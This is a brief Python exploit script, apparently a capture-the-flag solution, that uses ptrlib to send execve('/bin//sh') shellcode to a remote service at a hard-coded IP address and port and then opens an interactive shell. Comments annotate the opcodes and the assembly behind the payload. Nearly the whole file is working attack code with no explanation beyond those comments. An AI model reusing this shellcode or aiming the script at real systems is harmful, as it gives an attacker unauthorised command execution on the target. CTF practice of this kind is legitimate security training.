from ptrlib import *

# 5a: pop rdx
# 5f: pop rdi
# 0f 05: syscall
# 6a XX: push imm8
# 68 XXXXXXXX: push imm32
# 66 05 XXXX: add ax, imm16
# 05 XXXXXXXX: add eax, imm32
# 2c XX: sub al, imm8

###
# mov rax, 59
# push 0
# push '/bin//sh'
# mov rdi, rsp
# mov rsi, 0
# mov rdx, 0
# syscall

shellcode = b''
shellcode += b'\x00\xc0'
shellcode += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

#sock = Process(["stdbuf", "-o", "0", "./shellcode"])
sock = Socket("34.92.37.22", 10002)
sock.send(shellcode)
sock.interactive()
